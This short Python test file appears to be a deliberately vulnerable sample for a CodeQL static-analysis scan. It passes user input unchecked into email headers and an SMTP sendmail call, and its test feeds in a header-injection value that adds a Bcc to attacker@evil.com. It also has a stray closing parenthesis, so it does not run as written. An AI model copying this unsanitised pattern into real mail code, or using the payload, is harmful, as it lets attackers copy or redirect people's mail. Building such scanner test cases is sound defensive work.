import os
import smtplib
from email.message import EmailMessage

def vulnerable_email_function(user_name, user_email, order_id, smtp_from):
    """Demonstrates email header injection vulnerabilities"""
    
    # Vulnerability 1: User input flows to email header
    msg = EmailMessage()
    msg["From"] = smtp_from  # SINK: SMTP envelope field
    msg["To"] = f"{user_name} <{user_email}>"  # SINK: Email header with user input
    msg["Subject"] = f"Order #{order_id} confirmed"  # SINK: Email header with user input
    
    # Vulnerability 2: User input flows to SMTP sendmail
    with smtplib.SMTP("localhost", 1025) as s:
        s.sendmail(smtp_from, [user_email], msg.as_string())  # SINK: SMTP sendmail call

def test_vulnerable_paths():
    # Sources: Function parameters with suspicious names
    vulnerable_email_function(
        user_name="Evil\\r\\nBcc: attacker@evil.com",  # SOURCE: Potential header injection
        user_email="victim@example.com", 
        order_id="12345",
        smtp_from="shop@example.com"
    )
    )
# Force fresh CodeQL scan - Tue Sep 10 14:25:00 UTC 2025
